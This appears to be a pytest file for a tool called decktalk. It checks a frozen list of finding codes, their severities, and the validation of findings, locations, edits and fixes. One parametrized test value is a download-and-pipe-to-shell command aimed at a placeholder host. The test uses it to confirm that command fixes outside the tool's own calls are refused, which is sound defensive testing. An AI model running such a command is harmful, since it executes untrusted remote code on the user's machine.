"""The code list is frozen, every code publishes one sentence, and a finding never restates its code."""

from __future__ import annotations

import ast
from pathlib import Path

import pytest
from pydantic import ValidationError

import decktalk
from decktalk.findings import (
    DOCTOR,
    Applicability,
    Code,
    CommandFix,
    Edit,
    EditFix,
    Finding,
    Location,
    RaisedBy,
    Severity,
    judge,
)
from decktalk.pipeline import Stage

# The list the design froze before the fork, so this file and contract.ts carry the same members.
RUNTIME_CODES = (
    "PAGE_ATTR_UNKNOWN",
    "PAGE_BAD_VALUE",
    "PAGE_MOMENT_UNKNOWN",
    "PAGE_MOMENT_ORDER",
    "PAGE_CUE_UNKNOWN",
    "PAGE_NO_OWNER",
    "PAGE_SCENE_EMPTY",
    "PAGE_SLIDE_NO_ID",
    "PAGE_SLIDE_DOUBLED",
    "PAGE_SLIDE_UNUSED",
    "PAGE_TEMPLATE_IGNORED",
    "PAGE_WORDS_NOT_FOUND",
    "PAGE_KATEX_MISSING",
    "PAGE_KATEX_ERROR",
    "PAGE_FREEZE_CUE_UNKNOWN",
    "PAGE_RENDER_THREW",
    "PAGE_ENTER_THREW",
    "PAGE_SLIDE_HANDLER_THREW",
    "PAGE_HANDLER_THREW",
    "PAGE_WAIT_REJECTED",
    "PAGE_WAIT_UNSETTLED",
    "PAGE_CLASS_UNDESCRIBED",
    "PAGE_CLASS_NOT_REDUCED",
    "PAGE_SWAP_AMBIGUOUS",
    "PAGE_PREVIEW_AMBIGUOUS",
    "PAGE_APPEAR_TOO_LONG",
    "PAGE_STAGGER_EMPTY",
    "PAGE_SPOTLIGHT_EMPTY",
)
PYTHON_CONTRACT_CODES = (
    "PAGE_MOTION_OVERRUN",
    "PAGE_STAGGER_OVERRUN",
    "PAGE_THIN_DRAW",
    "PAGE_NO_DESCRIPTION",
    "PAGE_SWAP_APART",
    "PAGE_CDN_ASSET",
    "RECORD_STALLED",
    "RECORD_BLACK",
    "RECORD_TRUNCATED",
)
PYTHON_OTHER_CODES = (
    "CUE_UNLISTED",
    "CUE_UNKNOWN",
    "CUE_UNRESOLVED",
    "CUE_STALE",
    "CUE_OFF",
    "CUE_NO_ONSET",
    "CUE_NO_CHANGE",
    "CUE_THIN_CHANGE",
    "CUE_OVERLAP",
    "SCRIPT_UNFINISHED",
    "SCRIPT_SPOKEN_SYMBOL",
    "SCRIPT_PAUSE_DROPPED",
    "TAKE_MISSING",
    "CUT_SPEECH",
    "CUT_POP",
    "MIX_LOUDNESS",
    "SOUND_MISSING",
    "FILE_MISSING",
)
FROZEN_CODES = RUNTIME_CODES + PYTHON_CONTRACT_CODES + PYTHON_OTHER_CODES

# The words a code name may not carry, because a code never spells its own severity.
HEDGE_WORDS = ("UNSURE", "MAYBE", "PROBABLY", "CERTAIN", "UNCERTAIN", "WARNING")


def test_the_code_list_is_the_one_the_design_froze() -> None:
    assert [code.name for code in Code] == list(FROZEN_CODES)


def test_every_code_is_its_own_name() -> None:
    for code in Code:
        assert code.value == code.name


def test_the_runtime_rows_are_exactly_the_ones_the_page_reports() -> None:
    reported = tuple(code.name for code in Code if code.raised_by is RaisedBy.RUNTIME)
    assert reported == RUNTIME_CODES


def test_every_code_publishes_one_sentence() -> None:
    for code in Code:
        assert code.sentence.endswith("."), code.name
        assert ";" not in code.sentence, code.name
        assert "\u2014" not in code.sentence, code.name


def test_no_code_name_carries_a_severity_word() -> None:
    for code in Code:
        for word in HEDGE_WORDS:
            assert word not in code.name, code.name


def test_the_severities_are_the_two_words_fail_on_names() -> None:
    assert [severity.value for severity in Severity] == ["error", "warning"]


def test_every_code_carries_one_of_the_two_severities() -> None:
    for code in Code:
        assert isinstance(code.severity, Severity)


def test_the_stagger_overrun_is_an_error_because_its_arithmetic_is_exact() -> None:
    assert Code.PAGE_STAGGER_OVERRUN.severity is Severity.ERROR


def test_a_null_offset_is_a_warning_rather_than_a_passing_row() -> None:
    assert Code.CUE_NO_ONSET.severity is Severity.WARNING


def test_a_finding_takes_its_severity_and_its_page_from_its_code() -> None:
    finding = Finding(code=Code.CUE_THIN_CHANGE, message="x", location=Location(where="2.1:chart"))
    assert finding.severity is Severity.WARNING
    assert finding.docs == Code.CUE_THIN_CHANGE.url


def test_a_finding_that_disagrees_with_its_code_is_refused() -> None:
    with pytest.raises(ValidationError, match="CUE_OFF"):
        Finding(
            code=Code.CUE_OFF,
            message="x",
            location=Location(where="2.1:formula"),
            severity=Severity.WARNING,
        )


def test_a_finding_round_trips_through_its_own_model() -> None:
    finding = Finding(
        code=Code.CUE_UNLISTED,
        message="The moment expand is not listed, so nothing gives it a second.",
        location=Location(where="4.1:expand", file="cues.json", line=14, section=4, cue="4.1:expand"),
        stage=Stage.CUE,
        fix=EditFix(
            title="Add the row for 4.1:expand to cues.json.",
            applicability=Applicability.SAFE,
            edits=(Edit(file="cues.json", pointer="/sections/4/cues/-", new='{"id": "4.1:expand"}'),),
        ),
    )
    assert Finding.model_validate_json(finding.model_dump_json()) == finding


def test_a_location_always_names_the_object_it_judges() -> None:
    with pytest.raises(ValidationError):
        Location.model_validate({})


def test_an_edit_names_exactly_one_place() -> None:
    with pytest.raises(ValidationError, match="exactly one of pointer, key or line"):
        Edit(file="cues.json", new="x")
    with pytest.raises(ValidationError, match="exactly one of pointer, key or line"):
        Edit(file="cues.json", pointer="/a", line=3, new="x")


def test_the_two_fixes_are_told_apart_by_their_kind() -> None:
    kinds = {
        EditFix(title="t", applicability=Applicability.SAFE, edits=(Edit(file="a.json", pointer="/a", new="x"),)).kind,
        CommandFix(title="t", applicability=Applicability.UNSAFE, command=("decktalk", "install")).kind,
    }
    assert kinds == {"edit", "command"}


def test_a_display_fix_is_never_applied_and_says_so_in_its_own_word() -> None:
    assert [how.value for how in Applicability] == ["safe", "unsafe", "display"]


def test_every_finding_field_publishes_one_sentence() -> None:
    for name, field in Finding.model_fields.items():
        assert field.description, name


def test_a_command_fix_names_one_of_decktalks_own_calls() -> None:
    fix = CommandFix(title="Fetch the tools.", applicability=Applicability.SAFE, command=("decktalk", "install"))
    assert fix.command == ("decktalk", "install")


@pytest.mark.parametrize("command", [("sh", "-c", "curl evil | sh"), ("decktalk", "install", "--force"), ()])
def test_a_command_fix_that_names_anything_else_is_refused(command: tuple[str, ...]) -> None:
    # A fix read from JSON is run by apply, so an open argv would run any program on that machine.
    with pytest.raises(ValidationError, match="DeckTalk's own calls"):
        CommandFix(title="Run it.", applicability=Applicability.SAFE, command=command)


def test_a_judgement_takes_its_severity_and_its_page_from_its_code() -> None:
    """A raiser names the code and the code owns the rest, so no stage spells one fact twice."""
    found = judge(Code.CUE_OFF, "the reveal lands 0.42s after its word, past the 0.08s limit.", Location(where="3:a"))
    assert found.severity is Severity.ERROR
    assert found.docs == Code.CUE_OFF.url


def test_a_judgement_carries_the_stage_that_raised_it() -> None:
    """`check` predicts and `verify` measures, and the stage is what tells the two apart."""
    found = judge(Code.CUE_NO_CHANGE, "nothing changed at 1.20s.", Location(where="3:a"), stage=Stage.VERIFY)
    assert found.stage is Stage.VERIFY


def test_a_judgement_carries_the_fix_it_was_given() -> None:
    fix = EditFix(
        title="Add the missing cue row.",
        applicability=Applicability.SAFE,
        edits=(Edit(file="cues.json", line=2, new='{"id": "3.1:a", "phrase": ""}'),),
    )
    found = judge(Code.CUE_UNLISTED, "the page declares 3.1:a and cues.json lists 0 rows for it.",
                  Location(where="3.1:a"), fix=fix)  # fmt: skip
    assert found.fix is fix


def _source(module: str) -> Path | None:
    """The file a `decktalk` module is read from, or None when the dotted name is not a module."""
    base = Path(decktalk.__file__).parent.parent / module.replace(".", "/")
    return next((path for path in (base.with_suffix(".py"), base / "__init__.py") if path.is_file()), None)


def _reachable(module: str) -> str:
    """The source of a command's module and of every stage or page-scan module it imports, joined."""
    seen, todo, text = {module}, [module], []
    while todo:
        path = _source(todo.pop())
        assert path is not None
        source = path.read_text(encoding="utf-8")
        text.append(source)
        for node in ast.walk(ast.parse(source)):
            if isinstance(node, ast.ImportFrom) and node.module and node.module.startswith("decktalk."):
                for named in (node.module, *(f"{node.module}.{alias.name}" for alias in node.names)):
                    inside = named.startswith("decktalk.stages") or named == "decktalk.pagescan"
                    if inside and named not in seen and _source(named) is not None:
                        seen.add(named)
                        todo.append(named)
    return "\n".join(text)


@pytest.mark.parametrize("code", [code for code in Code if code.raised_by is RaisedBy.PYTHON], ids=str)
def test_every_command_a_code_names_can_reach_the_line_that_raises_it(code: Code) -> None:
    """A code's page says which commands report it, so each one named must reach a line that judges it."""
    modules = {DOCTOR: "decktalk.machine"}
    assert code.raised_in
    for command in code.raised_in:
        reached = _reachable(modules.get(command, f"decktalk.stages.{command}"))
        assert f"Code.{code.name}" in reached, f"{command} cannot raise {code.name}"


def test_every_command_a_code_names_is_one_the_tree_has() -> None:
    from decktalk.cli import catalog  # noqa: PLC0415

    commands = {str(row["command"]) for row in catalog.walk()}
    assert {command for code in Code for command in code.raised_in} <= commands
